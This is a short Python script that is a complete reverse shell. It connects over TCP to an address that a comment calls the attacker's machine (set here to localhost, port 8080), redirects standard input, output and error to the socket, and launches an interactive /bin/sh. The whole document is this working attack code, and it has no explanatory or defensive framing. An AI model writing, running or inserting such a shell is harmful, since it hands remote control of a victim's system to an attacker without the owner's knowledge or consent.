import socket
import subprocess
import os

# Target IP and port (attacker's machine)
IP = '127.0.0.1'
PORT = 8080

# Create a socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

# Redirect STDIN, STDOUT, STDERR to socket
os.dup2(s.fileno(), 0)  # STDIN
os.dup2(s.fileno(), 1)  # STDOUT
os.dup2(s.fileno(), 2)  # STDERR

# Spawn a shell
subprocess.call(['/bin/sh', '-i'])
